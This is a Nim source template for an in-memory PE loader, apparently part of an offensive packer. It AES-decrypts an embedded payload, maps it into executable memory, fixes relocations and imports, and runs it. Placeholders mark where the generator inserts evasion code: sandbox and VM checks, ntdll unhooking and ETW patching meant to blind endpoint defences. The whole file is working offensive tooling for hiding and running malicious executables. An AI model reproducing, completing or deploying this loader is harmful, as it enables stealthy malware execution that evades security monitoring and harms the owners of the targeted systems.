
import winim
import ptr_math
import strutils
import nimcrypto
import base64
import streams
import os

# Obfuscate strings
#@@ObfuscateStrings@@


#@DirectSyscallsDefinitions
# constants
const baseRelocationBlock = 0x8
const baseRelocationEntry = 0x2

# utils
func toByteSeq*(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

# change to use string in memory
proc loadPeToMem*(filePath: string): ptr=
    # read file data
    var rawPeData = readFile(filePath)
    var lpPeBuffer = toByteSeq(rawPeData)
    return lpPeBuffer[0].addr


proc getDosHeader*(lpBuffer: pointer): PIMAGE_DOS_HEADER =
    # error if invalid pointer sent to function
    if lpBuffer == nil:
        return nil 
    return cast[PIMAGE_DOS_HEADER](lpBuffer)

proc getNtHeader*(lpBuffer: pointer): PIMAGE_NT_HEADERS =
    # error if invalid pointer sent to function
    if lpBuffer == nil:
        return nil 
    return cast[PIMAGE_NT_HEADERS](cast[int](lpBuffer) + cast[PIMAGE_DOS_HEADER](lpBuffer).e_lfanew)


proc isPE*(dosHeader: PIMAGE_DOS_HEADER): bool =
    if dosHeader.e_magic == 0x5A4D:
        return true
    return false

proc is64*(ntHeaders: PIMAGE_NT_HEADERS): bool =
    if ntHeaders.OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC:
        return true
    return false

proc isDll*(ntHeaders: PIMAGE_NT_HEADERS): bool =
    if ntHeaders.FileHeader.Characteristics == IMAGE_FILE_DLL:
        return true
    return false

proc isNET*(ntHeaders: PIMAGE_NT_HEADERS): bool =
    if ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].Size != 0:
        return true
    return false


proc allocateMemory*(ntHeaders: PIMAGE_NT_HEADERS, hProcess: HANDLE): ptr BYTE = 
    echo "[+] Allocating Memory"
    var pImageBase: ptr BYTE = nil 

    pImageBase = cast[ptr BYTE](VirtualAllocEx(hProcess, cast[LPVOID](ntHeaders.OptionalHeader.ImageBase), ntHeaders.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE))
   
    echo "\t|-> Address 0x", toHex(repr pImageBase)

    return pImageBase

proc mapPeSections*(lpBuffer: pointer, ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE) =
    echo "[+] Mapping PE sections"
    var pImageSectionHeader = IMAGE_FIRST_SECTION(ntHeaders)
    var pImageSectionHeaderArray = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](pImageSectionHeader)
    # iterate through sections
    for i in 0 ..< ntHeaders.FileHeader.NumberOfSections.int:
        var sectionDestination = cast[pointer](cast[int](pImageBase) + pImageSectionHeaderArray[i].VirtualAddress)
        var sectionSource = cast[pointer](cast[int](lpBuffer) + pImageSectionHeaderArray[i].PointerToRawData)
        echo "\t|-> Mapping section: ", cast[cstring](pImageSectionHeaderArray[i].Name[0].addr), " @ 0x", repr sectionDestination
        copyMem(
            sectionDestination,
            sectionSource,
            pImageSectionHeaderArray[i].SizeOfRawData
        )

proc getRelocAddr*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): LPVOID=
    return pImageBase + ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress

proc calcRelocDelta*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): ptr BYTE =
    return cast[ptr BYTE](pImageBase) - ntHeaders.OptionalHeader.ImageBase

proc checkPreferedAddress*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): bool =
    echo "[+] Checking prefered address"
    var preferAddr: LPVOID = cast[LPVOID](ntHeaders.OptionalHeader.ImageBase)
    if preferAddr != pImageBase:
        echo "\t|-> pImageBase != preferAddr"
        return true
    echo "\t|-> pImageBase == preferAddr"
    return false

proc baseRelocation*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE, hProcess: HANDLE): bool =
    echo "[+] Perform Base Relocation"
    # find relocation table
    var 
        pRelocationTable: LPVOID = getRelocAddr(ntHeaders, pImageBase)
        deltaImageBase = calcRelocDelta(ntHeaders, pImageBase)
        relocationsProcessed = 0
    echo "\t|-> Delta: ", toHex(cast[ULONGLONG](deltaImageBase))
    echo "[+] Processing relocations"
    var 
        pResult32: uint32 
        pResult16: uint16
        sizeResult32 = cast[SIZE_T](sizeof(pResult32))
        sizeResult16 = cast[SIZE_T](sizeof(pResult16))

    # parse Relocation table
    var relocationTable: LPVOID = pRelocationTable
    echo "\t[+] relocationsTable.repr: ",relocationTable.repr
    echo "[+] Processing relocations"
    echo "\t|-> Reloc Size: ", ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size
    while relocationsProcessed < ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size: 
        # read relocation block RVA from proc memory
        ReadProcessMemory(hProcess, pRelocationTable + relocationsProcessed, addr pResult32, sizeResult32, nil)
        var relocationPageAddress = (cast[int](pResult32)) 
        var pageAddress = relocationPageAddress
        # update the relocations processed using the size of the block
        ReadProcessMemory(hProcess, pRelocationTable + relocationsProcessed + 0x4, addr pResult32, sizeResult32, nil)
        relocationsProcessed += baseRelocationBlock
        # get the relocations count for current entry (items in CFF)
        var relocationsCount = int((cast[int](pResult32) - baseRelocationBlock) / baseRelocationEntry)
        echo "\t|-> relocationsCount: ", relocationsCount
        var i = 0
        relocationsProcessed = relocationsProcessed - baseRelocationEntry
        # Now iterate through all items in current entry
        while i <= relocationsCount:
            # Get relocation value
            relocationsProcessed += baseRelocationEntry
            ReadProcessMemory(hProcess, pRelocationTable + relocationsProcessed, addr pResult16, sizeResult16, nil)
            if toHex(pResult16)[0] == '0':
                relocationsProcessed += baseRelocationEntry
                break
            # Remove type from relocation value
            var relocationEntryOffset = parseHexInt(toHex(pResult16)[1..<4])
            var relocationRVA = pageAddress + cast[int](relocationEntryOffset) 

            var addressToPatch: ptr BYTE = nil
            ReadProcessMemory(hProcess,(pImageBase + relocationRVA), addr addressToPatch, sizeof(DWORD_PTR), nil);
            addressToPatch += cast[ULONGLONG](deltaImageBase)
            copymem((pImageBase + relocationRVA), addr addressToPatch, sizeof(DWORD_PTR));
            inc(i)
    return true

proc resolveThunks(thunk: PIMAGE_THUNK_DATA, pImageBase: ptr BYTE, call_via: csize_t, thunk_addr: csize_t, libraryName: LPSTR) =
    var offsetField: csize_t = 0
    var offsetThunk: csize_t = 0
    var hModule: HMODULE = LoadLibraryA(libraryName)

    while true:
        var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](pImageBase) + offsetField + call_via))
        var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
            cast[csize_t](pImageBase) + offsetThunk + thunk_addr))
        var boolvar: bool
        if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
            boolvar = true
        elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
            boolvar = true

        if (boolvar):
            var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libraryName),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
            fieldThunk.u1.Function = ULONGLONG(libaddr)
            echo "\t\t[V] API ord: ", (orginThunk.u1.Ordinal and 0xFFFF)

        if fieldThunk.u1.Function == 0:
            break
        if fieldThunk.u1.Function == orginThunk.u1.Function:
            var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
            var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](pImageBase) + cast[DWORD](nameData))
            var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
            var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule, func_name))     
            echo "\t\t[V] API: ", func_name
            fieldThunk.u1.Function = ULONGLONG(libaddr)

        inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
        inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))

proc resolveImportAddressTable(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE): bool =
    echo "[+] Fixing the Import Address Table (IAT)"
    # define variables used to parse data
    var importDescriptor: PIMAGE_IMPORT_DESCRIPTOR = nil
    var importDirAddr: csize_t = cast[csize_t](ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
    importDescriptor = cast[PIMAGE_IMPORT_DESCRIPTOR](importDirAddr)
    var libraryName: LPSTR = ""
    var hLibrary: HMODULE
    var importsParsedSize: csize_t = 0
    var importsMaxSize: csize_t = cast[csize_t](ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
    
    # iterate through libraries to import
    while importsParsedSize < importsMaxSize:
        importDescriptor = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
            importDirAddr + importsParsedSize + cast[uint64](pImageBase)))
        
        if (importDescriptor.union1.OriginalFirstThunk == 0) and (importDescriptor.FirstThunk == 0):
            break
        libraryName = cast[LPSTR](cast[ULONGLONG](pImageBase) + importDescriptor.Name)

        hLibrary = LoadLibraryA(libraryName)
        echo "\t[+] Import DLL: ", libraryName
        if hLibrary != 0:
            # resolve thunks    
            var thunk: PIMAGE_THUNK_DATA = nil
            thunk = cast[PIMAGE_THUNK_DATA](cast[DWORD_PTR](pImageBase) + importDescriptor.FirstThunk)
            var call_via: csize_t = cast[csize_t](importDescriptor.FirstThunk)
            var thunk_addr: csize_t = cast[csize_t](importDescriptor.union1.OriginalFirstThunk)
            if thunk_addr == 0:
                thunk_addr = csize_t(importDescriptor.FirstThunk)

            resolveThunks(thunk, pImageBase, call_via, thunk_addr, libraryName)

        inc(importsParsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
    return true


#@@AesVariables@@

var encPayload = "@@EncryptedPayload@@"


proc transferExecution*(ntHeaders: PIMAGE_NT_HEADERS, pImageBase: ptr BYTE, hProcess: HANDLE) =
    echo "[+] Executing PE in memory"
    var entryPoint = cast[LPTHREAD_START_ROUTINE](ntHeaders.OptionalHeader.AddressOfEntryPoint + cast[ULONGLONG](pImageBase))
    echo "\t|-> @ 0x", toHex(ntHeaders.OptionalHeader.AddressOfEntryPoint + cast[ULONGLONG](pImageBase))
    #@@executionType@@

# Evasion
# Obfuscation
#@@StringObfuscation@@
# Sandbox
#@@SandboxMsgStart@@
#@@delayExecution@@
#@@sleepCheck@@
#@@checkVM@@
#@@checkRam@@
#@@checkUsername@@
#@@SandboxMsgEnd@@
# EDR
#@@unhookNtDll@@
#@@patchETW@@


proc decryptData(payload: string): seq[byte] =
    # Expand key to 32 bytes using SHA256 as the KDF
    echo "\t[+] Expanding key"
    var expandedkey = sha256.digest(envkey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))
    echo "\t[+] Decoding"
    var dectext = newSeq[byte](len(payload))

    echo "\t[+] Decrypting"
    var str: string = decode(payload)
    ectx.init(key, iv)
    ectx.decrypt(toByteSeq(str), dectext)
    ectx.clear()
    return dectext

#@@userInput@@
proc NimMain() {.cdecl, importc.}

proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
    var hProcess = GetCurrentProcess()
    var payloadSeq = decryptData(encPayload)
    var lpBuffer: ptr = payloadSeq[0].addr

    var ntHeaders = getNtHeader(lpBuffer)
    var pImageBase = allocateMemory(ntHeaders, hProcess)
    mapPeSections(lpBuffer, ntHeaders, pImageBase)
    var performBaseReloc = checkPreferedAddress(ntHeaders, pImageBase)

    if performBaseReloc:
        var bReloc = baseRelocation(ntHeaders, pImageBase, hProcess)
        if bReloc: 
            echo "[+] Base relocations successfully updated"
        else: 
            quit(-1)

    var fixIat = resolveImportAddressTable(ntHeaders, pImageBase)
    if fixIat: 
        echo "[+] IAT successfully updated"
    else: 
        quit(-1)

    transferExecution(ntHeaders, pImageBase, hProcess)
    return 0

when isMainModule:
    discard main(NULL)

